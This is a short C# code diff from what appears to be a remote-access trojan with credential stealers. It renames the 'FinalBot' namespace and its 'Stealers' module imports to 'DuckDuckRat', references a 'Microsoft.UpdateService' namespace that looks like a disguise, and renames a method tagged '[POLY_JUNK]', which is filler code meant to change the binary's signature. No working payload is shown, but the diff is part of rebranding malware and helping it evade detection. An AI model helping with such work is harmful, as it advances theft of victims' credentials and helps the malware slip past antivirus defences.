@@ -3,15 +3,15 @@ using System.IO;
 using System.IO.Compression;
 using System.Threading.Tasks;
 using Microsoft.UpdateService.Modules; 
-using FinalBot.Modules;
-using FinalBot.Stealers;
+using DuckDuckRat.Modules;
+using DuckDuckRat.Stealers;
 
-namespace FinalBot
+namespace DuckDuckRat
 {
     public static class ReportManager
     {
         // [POLY_JUNK]
-        private static void _vanguard_906a5958() {
+        private static void _DuckDuckRat_906a5958() {
             int val = 26537;
             if (val > 50000) Console.WriteLine("Hash:" + 26537);
         }
@@ -81,3 +81,5 @@ namespace FinalBot
         }
     }
 }
+
+
